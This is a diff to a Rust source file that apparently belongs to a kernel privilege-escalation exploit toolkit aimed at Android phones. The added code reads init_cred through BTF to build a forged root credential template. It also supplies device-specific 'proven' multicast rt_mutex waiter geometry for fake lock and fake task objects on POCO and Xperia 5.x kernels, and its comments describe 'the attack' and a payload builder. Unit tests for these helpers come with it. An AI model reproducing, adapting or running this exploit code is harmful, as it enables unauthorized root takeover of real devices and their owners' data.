@@ -96,7 +96,71 @@ pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
 
 #[cfg(test)]
 mod tests {
-    use super::remove_waiter_uses_current;
+    use super::{
+        multicast_geometry_5x, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
+    };
+    use std::collections::BTreeMap;
+
+    #[test]
+    fn cred_caps_selects_the_contiguous_non_zero_run() {
+        let slots: &[(u32, u64)] = &[
+            (0x28, 0),
+            (0x30, 0x1ffffffffff),
+            (0x38, 0x1ffffffffff),
+            (0x40, 0x1ffffffffff),
+            (0x48, 0),
+        ];
+        let read = |offset: u32| slots.iter().find(|(o, _)| *o == offset).map(|(_, v)| *v);
+        assert_eq!(
+            select_cred_caps(read, 0x28, 0x50),
+            Some((0x30, 3, 0x1ffffffffff))
+        );
+    }
+
+    #[test]
+    fn cred_caps_rejects_an_all_zero_range() {
+        assert_eq!(select_cred_caps(|_| Some(0u64), 0x28, 0x50), None);
+    }
+
+    #[test]
+    fn cred_refs_keep_only_non_zero_kernel_vas_in_offset_order() {
+        let slots = [
+            (0x78, 0),
+            (0x80, 0xffffffc00ab23a80),
+            (0x88, 0x0000000000000004),
+            (0x58, 0),
+            (0x98, 0xffffffc00ab23b28),
+            (0x90, 0xffffffc00ab23ff0),
+        ];
+        assert_eq!(
+            select_cred_refs(&slots),
+            vec![
+                (0x80, 0xffffffc00ab23a80),
+                (0x90, 0xffffffc00ab23ff0),
+                (0x98, 0xffffffc00ab23b28),
+            ]
+        );
+    }
+
+    #[test]
+    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
+        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        structs.insert("waiter_task".to_string(), Some(48));
+        structs.insert("waiter_lock".to_string(), Some(56));
+        let geometry = multicast_geometry_5x(&structs);
+        assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
+        assert!(geometry.contains(&("task_offset", 48)));
+        assert!(geometry.contains(&("lock_offset", 56)));
+        assert!(geometry.contains(&("fake_lock_offset", 4608)));
+        assert!(geometry.contains(&("fake_task_offset", 12800)));
+        assert!(geometry.contains(&("lock_slot_count", 12)));
+        assert!(geometry.contains(&("compact_waiter", 1)));
+
+        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        let geometry = multicast_geometry_5x(&without);
+        assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
+        assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
+    }
 
     #[test]
     fn patched_remove_waiter_never_reads_current() {
@@ -572,4 +636,189 @@ pub fn derive_nf_logger_registration(
         loggers_0_1: slot,
         nf_log_type_ulog: ulog_value,
     })
+}
+
+/* ------------------------------------------------------------------------- */
+/* 5.x credential template and multicast geometry                            */
+/* ------------------------------------------------------------------------- */
+
+/// The attack raises the usage count on the socket-pinned private copy; this is
+/// a route constant, not the image's `usage` value.
+pub const CRED_5X_USAGE_VALUE: u64 = 256;
+
+/// The proven 5.x multicast layout constants (POCO probe + Xperia 5.15):
+/// `waiter_off` comes from the IPv4 UDP `MCAST_BLOCK_SOURCE` probe,
+/// `fake_lock = z_pagemap_global + fake_lock_offset`,
+/// `fake_task = fake_lock + 0x2000`, the lock slots start at `fake_lock + 0x80`.
+pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
+pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;
+pub const MULTICAST_5X_FAKE_LOCK_OFFSET: i64 = 4608;
+pub const MULTICAST_5X_FAKE_TASK_OFFSET: i64 = 12800;
+pub const MULTICAST_5X_LOCK_SLOTS_OFFSET: i64 = 128;
+pub const MULTICAST_5X_LOCK_SLOT_COUNT: i64 = 12;
+pub const MULTICAST_5X_LOCK_SLOT_STRIDE: i64 = 8;
+
+/// Fields read from the real `init_cred`; the payload builder fills a private
+/// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Cred5x {
+    pub caps_offset: u32,
+    pub caps_count: u32,
+    pub caps_value: u64,
+    /// `(offset, image VA)` per reference slot, sorted by offset.
+    pub refs: Vec<(u32, u64)>,
+}
+
+/// Picks the capability run from the 8-byte slots in `caps_start..caps_end`:
+/// the first non-zero slot starts the run, which continues while the slots
+/// equal that value. The historical template selected `cap_permitted` through
+/// `cap_bset` this way (`0x30/0x38/0x40` on the Xperia `init_cred`).
+pub fn select_cred_caps(
+    read: impl Fn(u32) -> Option<u64>,
+    caps_start: u32,
+    caps_end: u32,
+) -> Option<(u32, u32, u64)> {
+    let mut offset = None;
+    let mut value = 0u64;
+    let mut count = 0u32;
+    let mut cursor = caps_start;
+    while cursor + 8 <= caps_end {
+        let Some(slot) = read(cursor) else { break };
+        if offset.is_none() {
+            if slot != 0 {
+                offset = Some(cursor);
+                value = slot;
+                count = 1;
+            }
+        } else if slot == value {
+            count += 1;
+        } else {
+            break;
+        }
+        cursor += 8;
+    }
+    offset.map(|offset| (offset, count, value))
+}
+
+/// Canonical arm64 kernel VA: the top 16 bits are set. Image pointers in
+/// `init_cred` are pre-KASLR canonical addresses and must be relocated.
+fn is_kernel_va(value: u64) -> bool {
+    value >> 48 == 0xffff
+}
+
+/// Selects the reference slots from the cred pointer members: non-zero
+/// canonical image VAs, in offset order. The Xperia `init_cred` yields exactly
+/// the four slots at `0x80/0x88/0x90/0x98`.
+pub fn select_cred_refs(slots: &[(u32, u64)]) -> Vec<(u32, u64)> {
+    let mut refs: Vec<(u32, u64)> = slots
+        .iter()
+        .copied()
+        .filter(|(_, value)| *value != 0 && is_kernel_va(*value))
+        .collect();
+    refs.sort_by_key(|(offset, _)| *offset);
+    refs.dedup_by_key(|(offset, _)| *offset);
+    refs
+}
+
+/// Derives the 5.x credential template: BTF gives the layout, the image's
+/// `init_cred` gives the values. `init_cred_off` is the image offset
+/// (`kallsyms init_cred - _text`).
+pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cred5x> {
+    let size = btf
+        .size("cred")
+        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
+    let start = init_cred_off as usize;
+    let end = start
+        .checked_add(size as usize)
+        .ok_or_else(|| ExtractError::new("init_cred offset overflows"))?;
+    let bytes = kernel
+        .get(start..end)
+        .ok_or_else(|| ExtractError::new("init_cred is outside the kernel image"))?;
+    let read = |offset: u32| -> Option<u64> {
+        let offset = offset as usize;
+        if offset + 8 > bytes.len() {
+            return None;
+        }
+        Some(u64::from_le_bytes(
+            bytes[offset..offset + 8].try_into().ok()?,
+        ))
+    };
+
+    let caps_start = btf
+        .field("cred", "cap_inheritable")
+        .ok_or_else(|| ExtractError::new("cred.cap_inheritable is missing from BTF"))?;
+    let caps_end = btf
+        .field("cred", "cap_ambient")
+        .map(|offset| offset + 8)
+        .unwrap_or(caps_start + 5 * 8)
+        .min(size);
+    let (caps_offset, caps_count, caps_value) = select_cred_caps(read, caps_start, caps_end)
+        .ok_or_else(|| ExtractError::new("no non-zero capability run in init_cred"))?;
+
+    let cred = btf
+        .named_struct("cred")
+        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
+    let slots: Vec<(u32, u64)> = cred
+        .members
+        .iter()
+        .filter_map(|member| {
+            if member.bit_offset % 8 != 0 {
+                return None;
+            }
+            let resolved = btf.resolve(member.type_id)?;
+            if resolved.kind != crate::btf::KIND_PTR {
+                return None;
+            }
+            let offset = member.bit_offset / 8;
+            if offset + 8 > size {
+                return None;
+            }
+            read(offset).map(|value| (offset, value))
+        })
+        .collect();
+    let refs = select_cred_refs(&slots);
+    if refs.is_empty() {
+        return Err(ExtractError::new(
+            "no reference pointers found in init_cred",
+        ));
+    }
+    if refs.len() > 4 {
+        return Err(ExtractError::new(format!(
+            "init_cred has {} reference pointers; the template holds 4",
+            refs.len()
+        )));
+    }
+
+    Ok(Cred5x {
+        caps_offset,
+        caps_count,
+        caps_value,
+        refs,
+    })
+}
+
+/// The 5.x multicast branch in the bundled profile order. Constants are the
+/// proven Xperia layout; `task_offset`/`lock_offset` come from BTF
+/// (`rt_mutex_waiter.task` / `.lock`). A missing BTF value omits that key so
+/// the built-in profile can supply it.
+pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = vec![
+        ("waiter_off", MULTICAST_5X_WAITER_OFF),
+        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
+    ];
+    if let Some(task) = structs.get("waiter_task").copied().flatten() {
+        geometry.push(("task_offset", i64::from(task)));
+    }
+    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
+        geometry.push(("lock_offset", i64::from(lock)));
+    }
+    geometry.extend([
+        ("fake_lock_offset", MULTICAST_5X_FAKE_LOCK_OFFSET),
+        ("fake_task_offset", MULTICAST_5X_FAKE_TASK_OFFSET),
+        ("lock_slots_offset", MULTICAST_5X_LOCK_SLOTS_OFFSET),
+        ("lock_slot_count", MULTICAST_5X_LOCK_SLOT_COUNT),
+        ("lock_slot_stride", MULTICAST_5X_LOCK_SLOT_STRIDE),
+        ("compact_waiter", 1),
+    ]);
+    geometry
 }
